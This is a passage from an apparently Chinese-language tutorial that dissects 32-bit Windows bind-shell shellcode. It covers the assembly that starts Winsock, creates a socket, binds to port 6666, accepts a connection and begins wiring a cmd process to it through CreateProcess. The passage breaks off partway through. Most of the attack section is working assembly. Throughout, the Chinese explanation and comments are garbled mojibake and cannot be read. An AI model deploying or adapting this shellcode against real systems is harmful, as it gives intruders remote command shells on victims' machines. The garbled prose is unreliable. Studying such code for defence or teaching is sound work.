<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">WSAStartup</span><span class="params">(</span></span><br><span class="line"><span class="params">        WORD      wVersionRequired,<span class="comment">//å¯ä»¥ä½¿ç”¨çš„windows å¥—æ¥å­—è§„èŒƒçš„æœ€é«˜ç‰ˆæœ¬</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">  [out] LPWSADATA lpWSAData<span class="comment">//è¿”å›å€¼,æŒ‡å‘WSADATAç»“æ„ä½“çš„æŒ‡é’ˆ</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­32ä½æœºå™¨ä¸Š,WSADATAé•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">        WORD                    wVersion;<span class="comment">//æˆ‘ä»¬è¦ä½¿ç”¨çš„ç‰ˆæœ¬</span></span><br><span class="line">        WORD                    wHighVersion;<span class="comment">//ç³»ç»Ÿèƒ½æä¾›ç»™æˆ‘ä»¬çš„ç‰ˆæœ¬</span></span><br><span class="line">        <span class="type">char</span>                    szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span>                    szSystemStatus[WSASYS_STATUS_LEN+<span class="number">1</span>];<span class="comment">//å½“å‰åº“çš„ç§’æ•°ä¿¡æ¯ï¼Œ2.0æ˜¯ç¬¬2ç‰ˆçš„æ„æ€</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxSockets;<span class="comment">//è¿”å›å¯ç”¨çš„socketæ•°é‡,2ç‰ˆæœ¬åªæœ‰å°±æ²¡ç”¨äº†</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          iMaxUdpDg;<span class="comment">//UDPæ•°æ®æŠ¥ä¿¡æ¯å¤§å°,2ç‰ˆæœ¬åªæœ‰å°±æ²¡ç”¨äº†</span></span><br><span class="line">        <span class="type">char</span> FAR *              lpVendorInfo;<span class="comment">//ä¾›åº”å•†ç‰¹å®šçš„ä¿¡æ¯,2ç‰ˆæœ¬åªæœ‰å°±æ²¡ç”¨äº†</span></span><br><span class="line">&#125; WSADATA;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…±11ä¸ªå­—èŠ‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; initialize winsock </span><br><span class="line">	</span><br><span class="line">	push esp 					; use stack for WSADATA </span><br><span class="line">	push 0x02 				; wVersionRequested </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; WSAStartup </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆespå‹æ ˆä½œä¸ºç¬¬äºŒä¸ªå‚æ•°çš„åœ°å€,è¿”å›çš„WSADATAç»“æ„ä½“å°†ä¼šå†™åˆ°æ­¤æ—¶çš„æ ˆé¡¶</p>
<p>0x02å‹æ ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°,å³å¥—æ¥å­—ç‰ˆæœ¬å·</p>
<p>esiæ°å¥½å°±æŒ‡å‘WSAStartUpçš„é¢„ç•™åœ°å€,lodsdç›¸å½“äº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[esi]</span><br><span class="line">add esi,4</span><br></pre></td></tr></table></figure>

<p>å°±è§£å¼•ç”¨å°†å‡½æ•°çš„ç»å¯¹åœ°å€æ”¾åˆ°eaxä¸Šäº†</p>
<p>ç„¶åcall eaxè°ƒç”¨API,è¿”å›å€¼å†™åˆ°æ‰€æœ‰å‚æ•°ä¹‹å‰çš„æ ˆé¡¶ä¸Š,å¦‚æœå‡½æ•°è°ƒç”¨æˆåŠŸåˆ™eax&#x3D;0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png" alt="image-20220918181142886"></p>
<h3 id="ç»™â€CMdâ€ç”»ä¸Šå¥å·"><a href="#ç»™â€CMdâ€ç”»ä¸Šå¥å·" class="headerlink" title="ç»™â€CMdâ€ç”»ä¸Šå¥å·"></a>ç»™â€CMdâ€ç”»ä¸Šå¥å·</h3><p>è¶ç€eaxåˆšä»WSAStartUpè¿”å›æ¥,å€¼ä¸º0,å°†0æ”¾åˆ°â€CMdâ€å­—ç¬¦ä¸²åé¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; null-terminate &quot;cmd&quot; </span><br><span class="line">	mov byte ptr [esi + 0x13], al ; eax = 0 if WSAStartup() worked </span><br></pre></td></tr></table></figure>





<h3 id="è°ƒç”¨WSASocketA"><a href="#è°ƒç”¨WSASocketA" class="headerlink" title="è°ƒç”¨WSASocketA"></a>è°ƒç”¨WSASocketA</h3><blockquote>
<p>WSASockAåˆ›å»ºä¸€ä¸ªç»‘å®šåˆ°ç‰¹æ®ŠæœåŠ¡æä¾›è€…çš„å¥—æ¥å­—</p>
<p>å…¶å‡½æ•°æ¥å£ä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SOCKET WSAAPI <span class="title function_">WSASocketA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 af,<span class="comment">//ç½‘ç»œå±‚åè®®,AF_INET(2)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 type,<span class="comment">//ä¼ è¾“å±‚ç±»å‹SOCK_STREAM(1)</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>                 protocol,<span class="comment">//ä¼ è¾“å±‚åè®®,TCP(6),UDP(17)</span></span></span><br><span class="line"><span class="params">  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,<span class="comment">//WSAPROTOCOL_INFOç»“æ„ä½“æŒ‡é’ˆ,ç”¨äºå­˜å‚¨ä¿¡æ¯</span></span></span><br><span class="line"><span class="params">  [in] GROUP               g,<span class="comment">//å¥—æ¥å­—ç»„ID</span></span></span><br><span class="line"><span class="params">  [in] DWORD               dwFlags<span class="comment">//å¥—æ¥å­—å±æ€§æ ‡å¿—</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè°ƒç”¨æˆåŠŸ,è¿”å›è¯¥å¥—æ¥å­—çš„æè¿°ç¬¦</p>
</blockquote>
<h4 id="æ¸…ç©ºæ ˆå¸§-ç›¸å½“äºå¡«å……NULLä½œä¸ºå‚æ•°"><a href="#æ¸…ç©ºæ ˆå¸§-ç›¸å½“äºå¡«å……NULLä½œä¸ºå‚æ•°" class="headerlink" title="æ¸…ç©ºæ ˆå¸§,ç›¸å½“äºå¡«å……NULLä½œä¸ºå‚æ•°"></a>æ¸…ç©ºæ ˆå¸§,ç›¸å½“äºå¡«å……NULLä½œä¸ºå‚æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; clear some stack to use as NULL parameters </span><br><span class="line">	lea ecx, [eax + 0x30] 		; sizeof(STARTUPINFO) = 0x44, ecx=0x30,é‡å¤30æ¬¡</span><br><span class="line">	mov edi, esp ;å½“å‰æ ˆé¡¶è®¾ç½®ä¸ºä¸²æ‹·è´çš„ç›®æ ‡</span><br><span class="line">	rep stosd 				; eax is still 0 eaxæ‹·è´åˆ°edi,ediè‡ªå¢4,ç›¸å½“äºå…¨éƒ½ç½®é›¶</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œä¹‹å‰æ ˆå¸§çš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png" alt="image-20220918191550943"></p>
<p>æ‰§è¡Œä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png" alt="image-20220918191620311"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">; create socket </span><br><span class="line">	inc eax 	;eax=1</span><br><span class="line">	push eax					; type = 1 (SOCK_STREAM) ,1å‹æ ˆ</span><br><span class="line">	inc eax ;eax=2</span><br><span class="line">	push eax ; af = 2 (AF_INET) IPv4åè®®</span><br><span class="line">	lodsd ;[esi]-&gt;eax,esi+=4,eaxæŒ‡å‘WSASocketAçš„åœ°å€</span><br><span class="line">	call eax ; WSASocketA </span><br><span class="line">	xchg ebp, eax				; save SOCKET descriptor in ebp (safe from </span><br><span class="line">								; being changed by remaining API calls) </span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨WSASocketAä¹‹å‰,æ ˆå¸§çš„çŠ¶æ€ä¸º</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png" alt="image-20220918192112499"></p>
<p>å‡½æ•°è°ƒç”¨è¿”å›å,eaxä¸­å­˜æ”¾çš„æ˜¯å¥—æ¥å­—æè¿°ç¬¦,äº¤æ¢åˆ°ebpä¸­ä¿å­˜èµ·æ¥</p>
<h3 id="bind-listen-acceptå¾ªç¯"><a href="#bind-listen-acceptå¾ªç¯" class="headerlink" title="bind,listen,acceptå¾ªç¯"></a>bind,listen,acceptå¾ªç¯</h3><h4 id="åˆå§‹åŒ–bindå‚æ•°"><a href="#åˆå§‹åŒ–bindå‚æ•°" class="headerlink" title="åˆå§‹åŒ–bindå‚æ•°"></a>åˆå§‹åŒ–bindå‚æ•°</h4><blockquote>
<p>bindå‡½æ•°ç”¨æ¥ç»‘å®šå¥—æ¥å­—</p>
<p>å…¶æ¥å£ä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET         s,<span class="comment">//å¥—æ¥å­—æè¿°ç¬¦</span></span></span><br><span class="line"><span class="params">       <span class="type">const</span> sockaddr *name,<span class="comment">//sockaddrç»“æ„ä½“æŒ‡é’ˆ,è¯¥ç»“æ„ä½“ç”¨äºæŒ‡å®šipv4åœ°å€è¿˜æœ‰ç«¯å£å·</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>            namelen<span class="comment">//nameæŒ‡å‘çš„ç»“æ„ä½“çš„å¤§å°</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>åªè¦æ˜¯<code>namelen&gt;sizeof(*name)</code>å°±å¯ä»¥,å› æ­¤namelenå¯ä»¥å¾€å¤§äº†è®¾ç½®ä¸ºä»»æ„å¤§å°</p>
<p>sockaddrç”¨æ¥æŒ‡å®šipåè®®ç±»å‹,ipåœ°å€è¿˜æœ‰ç«¯å£å·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line">	<span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç›¸å½“äºsockaddr_inç»“æ„ä½“,äºŒè€…åœ¨å¤§å°ä¸Šæ˜¯ç›¸åŒçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">	<span class="type">short</span> <span class="type">int</span> sin_family; <span class="comment">/* Address family */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> sin_port; <span class="comment">/* Port number */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet address */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* Same size as struct sockaddr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push bind parameters </span><br><span class="line">	mov eax, 0x0a1aff02 		; 0x1a0a = port 6666, 0x02 = AF_INET </span><br><span class="line">	xor ah, ah					; remove the ff from eax </span><br><span class="line">	push eax	 				; we use 0x0a1a0002 as both the name (struct </span><br><span class="line">								; sockaddr) and namelen (which only needs to </span><br><span class="line">								; be large enough) </span><br><span class="line">	push esp 					; pointer to our sockaddr struct </span><br></pre></td></tr></table></figure>



<p>0x0a1a0002è¿™ä¸ªå€¼ç›´æ¥å‹æ ˆä½œä¸ºnamelen,è¶³å¤Ÿå¤§äº†</p>
<p>0x0a1a0002,æœ€ä½ä¸¤ä¸ªå­—èŠ‚0x0002ç”¨æ¥å¡«sockaddr_in.sin_family</p>
<p>ç„¶åç”¨0x0a1a&#x3D;6666å¡«sockaddr_in.sin_port</p>
<p>å°†namelençš„æ ˆä¸­åœ°å€å‹æ ˆ,å› ä¸ºå…¶ä¸Šçš„æ•°ä¹Ÿå¯ä»¥ä½œä¸ºsock_addrç»“æ„ä½“</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png" alt="image-20220918195551305"></p>
<p>åˆ°æ­¤è¿˜æœ‰ä¸€ä¸ªå‚æ•°æ²¡æœ‰å‹æ ˆ,å³å¥—æ¥å­—æè¿°ç¬¦,å®ƒä¿å­˜åœ¨ebpä¸­</p>
<h4 id="ä¸‰è”å¾ªç¯-å¤ç”¨å¾ªç¯ä»£ç "><a href="#ä¸‰è”å¾ªç¯-å¤ç”¨å¾ªç¯ä»£ç " class="headerlink" title="ä¸‰è”å¾ªç¯,å¤ç”¨å¾ªç¯ä»£ç "></a>ä¸‰è”å¾ªç¯,å¤ç”¨å¾ªç¯ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	</span><br><span class="line">; call bind(), listen() and accept() in turn </span><br><span class="line">call_loop: </span><br><span class="line">	push ebp					; saved SOCKET descriptor (we implicitly pass </span><br><span class="line">								; NULL for all other params) </span><br><span class="line">	lodsd </span><br><span class="line">	call eax 					; call the next function </span><br><span class="line">	test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">								; returns a SOCKET descriptor </span><br><span class="line">	jz call_loop </span><br></pre></td></tr></table></figure>

<h5 id="é¦–å…ˆè°ƒç”¨bind"><a href="#é¦–å…ˆè°ƒç”¨bind" class="headerlink" title="é¦–å…ˆè°ƒç”¨bind"></a>é¦–å…ˆè°ƒç”¨bind</h5><p>ebpå­˜æ”¾çš„æ˜¯å¥—æ¥å­—æè¿°ç¬¦,å‹æ ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png" alt="image-20220918194646766"></p>
<p>ç„¶ålodsdå°†bindå‡½æ•°åœ°å€æ¬åˆ°eaxä¸Š,ç„¶åå‡½æ•°ediå‡½æ•°æŒ‡é’ˆåç§»4ä¸ªå­—èŠ‚,æŒ‡å‘listenäº†</p>
<p>eaxä¸­æ˜¯bindçš„åœ°å€,call eaxè°ƒç”¨bindäº†</p>
<p>å¦‚æœè°ƒç”¨æˆåŠŸåˆ™è¿”å›eax&#x3D;0,åˆæ°å¥½bind,listenæˆåŠŸçš„è¿”å›å€¼eax&#x3D;0,acceptæˆåŠŸçš„è¿”å›å€¼éé›¶,å› æ­¤å¯ä»¥æ ¹æ®eaxå€¼åˆ¤æ–­è¯¥å‡½æ•°æ˜¯ä¸æ˜¯accept</p>
<p>å¦‚æœè¿”å›0åˆ™ä¸æ˜¯,è¯´æ˜ä¸‰è”è¿˜æ²¡æœ‰å®Œæˆ,é‡æ–°call_loop</p>
<h5 id="ç„¶åè°ƒç”¨listen"><a href="#ç„¶åè°ƒç”¨listen" class="headerlink" title="ç„¶åè°ƒç”¨listen"></a>ç„¶åè°ƒç”¨listen</h5><blockquote>
<p>listenå‡½æ•°,å°†å¥—æ¥å­—è®¾ç½®ä¸ºç›‘å¬çŠ¶æ€</p>
<p>å…¶æ¥å£ä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">listen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET s,<span class="comment">//å¥—æ¥å­—æè¿°ç¬¦</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    backlog<span class="comment">//æŒ‚èµ·è¿æ¥é˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦,ä¸ç–¼ä¸ç—’</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬åªå¯¹ç¬¬ä¸€ä¸ªå‚æ•°,å¥—æ¥å­—æè¿°ç¬¦,æ„Ÿå…´è¶£,backlogçˆ±æ˜¯å•¥æ˜¯å•¥,åæ­£ä¸æ˜¯0å°±è¡Œ</p>
<p>äºæ˜¯åœ¨ç¬¬äºŒæ¬¡å¾ªç¯ä¸€å¼€å§‹åˆå°†ebpå‹å…¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°,å†å²ä¸Šçš„å †æ ˆ,çˆ±è°è°ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°</p>
<p>lodsd åˆå°†listenåœ°å€æ”¾åˆ°eaxä¸Šç„¶åediæŒ‡å‘ä¸‹ä¸€ä¸ªå‡½æ•°accept,</p>
<p>ç„¶åå°±è°ƒç”¨äº†listen,è¿”å›eax&#x3D;0</p>
<h5 id="æœ€åè°ƒç”¨accept"><a href="#æœ€åè°ƒç”¨accept" class="headerlink" title="æœ€åè°ƒç”¨accept"></a>æœ€åè°ƒç”¨accept</h5><blockquote>
<p>acceptç”¨äºæ¥æ”¶å¯¹å¥—æ¥å­—çš„è¿æ¥</p>
</blockquote>
<p>è°ƒç”¨æˆåŠŸè¿”å›æ–°çš„å¥—æ¥å­—æè¿°ç¬¦</p>
<h2 id="æ‹±æ‰‹è®©shell"><a href="#æ‹±æ‰‹è®©shell" class="headerlink" title="æ‹±æ‰‹è®©shell"></a>æ‹±æ‰‹è®©shell</h2><p>åˆ°æ­¤å¥—æ¥å­—é€šä¿¡å°±å»ºç«‹èµ·æ¥äº†,ä¸‹é¢è¦åˆ›å»ºä¸€ä¸ªcmdè¿›ç¨‹ç„¶åç»‘åˆ°å¥—æ¥å­—ä¸Š</p>
<blockquote>
<p>CreateProcessç”¨äºåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å¹¶åˆ›å»ºå…¶ä¸»çº¿ç¨‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(  </span></span><br><span class="line"><span class="params">ã€€LPCTSTR lpApplicationName, <span class="comment">// åº”ç”¨ç¨‹åºåç§°  </span></span></span><br><span class="line"><span class="params">ã€€LPTSTR lpCommandLine, <span class="comment">// å‘½ä»¤è¡Œå­—ç¬¦ä¸²  //è¿™é‡Œæ”¾&quot;CMd&quot;</span></span></span><br><span class="line"><span class="params">ã€€LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// è¿›ç¨‹çš„å®‰å…¨å±æ€§  </span></span></span><br><span class="line"><span class="params">ã€€LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// çº¿ç¨‹çš„å®‰å…¨å±æ€§  </span></span></span><br><span class="line"><span class="params">ã€€BOOL bInheritHandles, <span class="comment">// æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹çš„å±æ€§  </span></span></span><br><span class="line"><span class="params">ã€€DWORD dwCreationFlags, <span class="comment">// åˆ›å»ºæ ‡å¿—  </span></span></span><br><span class="line"><span class="params">ã€€LPVOID lpEnvironment, <span class="comment">// æŒ‡å‘æ–°çš„ç¯å¢ƒå—çš„æŒ‡é’ˆ  </span></span></span><br><span class="line"><span class="params">ã€€LPCTSTR lpCurrentDirectory, <span class="comment">// æŒ‡å‘å½“å‰ç›®å½•åçš„æŒ‡é’ˆ  </span></span></span><br><span class="line"><span class="params">ã€€LPSTARTUPINFO lpStartupInfo, <span class="comment">// ä¼ é€’ç»™æ–°è¿›ç¨‹çš„ä¿¡æ¯  </span></span></span><br><span class="line"><span class="params">ã€€LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// æ–°è¿›ç¨‹è¿”å›çš„ä¿¡æ¯  </span></span></span><br><span class="line"><span class="params">)</span>;  </span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­lpStartupInfoç”¨äºå’Œå¥—æ¥å­—ç»‘å®š,é‡è¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   DWORD cb;            <span class="comment">//åŒ…å«STARTUPINFOç»“æ„ä¸­çš„å­—èŠ‚æ•°.å¦‚æœMicrosoftå°†æ¥æ‰©å±•è¯¥ç»“æ„,å®ƒå¯ç”¨ä½œç‰ˆæœ¬æ§åˆ¶æ‰‹æ®µ.</span></span><br><span class="line">                        <span class="comment">//åº”ç”¨ç¨‹åºå¿…é¡»å°†cbåˆå§‹åŒ–ä¸ºsizeof(STARTUPINFO)</span></span><br><span class="line">   PSTR lpReserved;      <span class="comment">//ä¿ç•™ã€‚å¿…é¡»åˆå§‹åŒ–ä¸ºN U L L</span></span><br><span class="line">   PSTR lpDesktop;    <span class="comment">//ç”¨äºæ ‡è¯†å¯åŠ¨åº”ç”¨ç¨‹åºæ‰€åœ¨çš„æ¡Œé¢çš„åå­—ã€‚å¦‚æœè¯¥æ¡Œé¢å­˜åœ¨ï¼Œæ–°è¿›ç¨‹ä¾¿ä¸æŒ‡å®šçš„æ¡Œé¢ç›¸å…³è”ã€‚</span></span><br><span class="line">                      <span class="comment">//å¦‚æœæ¡Œé¢ä¸å­˜åœ¨ï¼Œä¾¿åˆ›å»ºä¸€ä¸ªå¸¦æœ‰é»˜è®¤å±æ€§çš„æ¡Œé¢ï¼Œå¹¶ä½¿ç”¨ä¸ºæ–°è¿›ç¨‹æŒ‡å®šçš„åå­—ã€‚</span></span><br><span class="line">                     <span class="comment">//å¦‚æœlpDesktopæ˜¯NULLï¼ˆè¿™æ˜¯æœ€å¸¸è§çš„æƒ…å†µ),é‚£ä¹ˆè¯¥è¿›ç¨‹å°†ä¸å½“å‰æ¡Œé¢ç›¸å…³è”</span></span><br><span class="line">   PSTR lpTitle;    <span class="comment">//ç”¨äºè®¾å®šæ§åˆ¶å°çª—å£çš„åç§°ã€‚å¦‚æœl p Ti t l e æ˜¯N U L L ï¼Œåˆ™å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—å°†ç”¨ä½œçª—å£å</span></span><br><span class="line">   DWORD dwX;       <span class="comment">//ç”¨äºè®¾å®šåº”ç”¨ç¨‹åºçª—å£åœ¨å±å¹•ä¸Šåº”è¯¥æ”¾ç½®çš„ä½ç½®çš„x å’Œy åæ ‡ï¼ˆä»¥åƒç´ ä¸ºå•ä½ï¼‰ã€‚</span></span><br><span class="line">   DWORD dwY;       <span class="comment">//åªæœ‰å½“å­è¿›ç¨‹ç”¨CW_USEDEFAULTä½œä¸ºCreateWindowçš„xå‚æ•°æ¥åˆ›å»ºå®ƒçš„ç¬¬ä¸€ä¸ªé‡å çª—å£æ—¶,</span></span><br><span class="line">                    <span class="comment">//æ‰ä½¿ç”¨è¿™ä¸¤ä¸ªåæ ‡ã€‚è‹¥æ˜¯åˆ›å»ºæ§åˆ¶å°çª—å£çš„åº”ç”¨ç¨‹åºï¼Œè¿™äº›æˆå‘˜ç”¨äºæŒ‡æ˜æ§åˆ¶å°çª—å£çš„å·¦ä¸Šè§’</span></span><br><span class="line"></span><br><span class="line">   DWORD dwXSize;  <span class="comment">//ç”¨äºè®¾å®šåº”ç”¨ç¨‹åºçª—å£çš„å®½åº¦å’Œé•¿åº¦ï¼ˆä»¥åƒç´ ä¸ºå•ä½ï¼‰åªæœ‰dwYsize</span></span><br><span class="line">    DWORD dwYSize;   <span class="comment">//å½“å­è¿›ç¨‹å°†C W _ U S E D E FA U LT ç”¨ä½œC r e a t e Wi n d o w çš„</span></span><br><span class="line">                    <span class="comment">// n Wi d t hå‚æ•°æ¥åˆ›å»ºå®ƒçš„ç¬¬ä¸€ä¸ªé‡å çª—å£æ—¶ï¼Œæ‰ä½¿ç”¨è¿™äº›å€¼ã€‚</span></span><br><span class="line">                     <span class="comment">//è‹¥æ˜¯åˆ›å»ºæ§åˆ¶å°çª—å£çš„åº”ç”¨ç¨‹åºï¼Œè¿™äº›æˆå‘˜å°†ç”¨äºæŒ‡æ˜æ§åˆ¶å°çª—å£çš„å®½åº¦</span></span><br><span class="line">   DWORD dwXCountChars;  <span class="comment">//ç”¨äºè®¾å®šå­åº”ç”¨ç¨‹åºçš„æ§åˆ¶å°çª—å£çš„å®½åº¦å’Œé«˜åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½ï¼‰</span></span><br><span class="line">   DWORD dwYCountChars;</span><br><span class="line">   DWORD dwFillAttribute;   <span class="comment">//ç”¨äºè®¾å®šå­åº”ç”¨ç¨‹åºçš„æ§åˆ¶å°çª—å£ä½¿ç”¨çš„æ–‡æœ¬å’ŒèƒŒæ™¯é¢œè‰²</span></span><br><span class="line">   DWORD dwFlags;           <span class="comment">//è¯·å‚è§ä¸‹ä¸€æ®µå’Œè¡¨4 - 7 çš„è¯´æ˜</span></span><br><span class="line">   WORD wShowWindow;        <span class="comment">//ç”¨äºè®¾å®šå¦‚æœå­åº”ç”¨ç¨‹åºåˆæ¬¡è°ƒç”¨çš„S h o w Wi n d o w å°†S W _ S H O W D E FA U LT ä½œä¸º</span></span><br><span class="line">                             <span class="comment">// n C m d S h o w å‚æ•°ä¼ é€’æ—¶ï¼Œè¯¥åº”ç”¨ç¨‹åºçš„ç¬¬ä¸€ä¸ªé‡å çª—å£åº”è¯¥å¦‚ä½•å‡ºç°ã€‚</span></span><br><span class="line">                             <span class="comment">// æœ¬æˆå‘˜å¯ä»¥æ˜¯é€šå¸¸ç”¨äºShow Wi n d o w å‡½æ•°çš„ä»»ä½•ä¸€ä¸ªS W _ *æ ‡è¯†ç¬¦</span></span><br><span class="line"> 